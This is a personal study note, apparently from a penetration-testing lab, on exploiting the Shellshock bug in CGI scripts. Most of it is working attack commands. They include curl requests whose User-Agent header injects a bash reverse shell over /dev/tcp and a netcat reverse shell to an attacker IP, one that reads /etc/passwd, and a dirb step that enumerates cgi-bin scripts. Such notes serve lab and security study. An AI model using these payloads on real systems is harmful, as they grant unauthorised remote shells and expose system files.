---
creation date: January 25th 2022
last modified date: January 25th 2022
aliases: []
tags: #📖
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📖  

# [[03 - Content/Shellshock]]  
```bash
curl -k -H "user-agent: () { :; }; echo; echo; id" https://blah/cgi-bin/index.cgi
```

### Is the webpage running a command? Use Shellshock.

If you see a page in cgi-bin running a command you can use shellshock to gain remote code injection.

you can use this to check for scripts: `dirb [http://10.10.10.56/cgi-bin](http://10.10.10.56/cgi-bin) -X .sh

you can also curl the webpage instead of visiting it directly:

`curl -v 10.10.10.56/cgi-bin/user.sh --proxy 127.0.0.1:8080

to exploit with curl:

`curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.5/443 0>&1' [http://10.10.10.56:80/cgi-bin/user.sh](http://10.10.10.56:80/cgi-bin/user.sh) --proxy 127.0.0.1:8080

`curl -H "User-Agent: () { :; }; nc -e /bin/sh 10.10.14.5 443" 10.10.10.56/cgi-bin/user.sh

`curl -H "User-Agent: () { :; };/bin/cat /etc/paswd" 10.10.10.56/cgi-bin/user.sh

There is a Metasploit module for shellshock

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: January 25th 2022 (01:20 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
